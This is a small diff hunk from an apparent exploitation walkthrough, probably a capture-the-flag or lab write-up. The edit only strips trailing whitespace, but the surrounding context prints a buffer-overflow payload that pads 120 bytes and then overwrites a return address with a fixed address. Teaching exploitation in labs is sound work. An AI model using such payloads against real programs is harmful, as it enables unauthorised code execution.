@@ -133,7 +133,7 @@ Our goal is to overwrite the return address with this value.
 
 ## Step 7 – Crafting the Payload
 
-Final payload:  
+Final payload:
 ```
 payload = b"A" * 120 + p64(0x4014b6)
 ```
